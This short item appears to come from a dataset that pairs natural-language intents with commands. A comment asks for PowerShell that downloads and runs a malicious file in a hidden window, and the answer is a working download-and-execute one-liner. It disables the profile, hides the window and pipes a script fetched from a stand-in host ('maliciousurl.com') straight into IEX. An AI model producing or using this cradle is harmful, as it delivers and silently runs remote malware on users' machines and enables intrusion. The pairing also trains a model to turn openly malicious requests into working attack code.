# Natural language intent:
# Execute PowerShell with specific settings to download and execute a malicious file from a specified URL with a hidden window.

powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousfile.ps1'); maliciousfile"
